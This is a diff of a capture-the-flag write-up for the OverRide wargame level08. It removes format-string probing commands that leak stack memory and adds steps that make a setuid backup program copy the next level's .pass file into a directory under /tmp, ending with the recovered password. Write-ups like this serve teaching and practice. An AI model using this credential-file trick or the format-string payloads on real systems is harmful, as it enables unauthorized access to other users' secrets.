@@ -15,14 +15,29 @@ copies char by char the content of the argument into a new file in `./backups/` 
 
 ## Exploit
 
-```console
-level08@OverRide:~$ ./level08 `python -c 'print "%08x" * 10'` ; cat backups/.log
-ERROR: Failed to open %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
-LOG: Starting back up: ffffffec000000ec00400d6cffffffffffffe8c800400d960060301072617453636162206666203a
-```
+The exploit is quite straightforward: first go to the only folder we have rights to write, `/tmp/`.
 
 ```console
-level08@OverRide:~$ ./level08 `python -c 'print "AAAA" + "%08x" * 100'` ; cat backups/.log
-ERROR: Failed to open AAAA%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
-LOG: Starting back up: AAAAffffffec000000ec00400d6cffffffffffffe75c00400d960060301072617453636162204141203a6666666630303030643030346666666637656666643030343033303634373136323631363032313436363636303330333033303336363636363635363033303330333333313337333133363
+level08@OverRide:~$ cd /tmp
 ```
+
+Then we are going to re-create a path for our file:
+
+```console
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
+```
+
+Ok, now we are calling `level08` program with the `level09`'s `.pass` file:
+
+```console
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+```
+
+And our `.pass` is copied!
+
+```console
+level08@OverRide:/tmp/backups$ cat home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+✌️
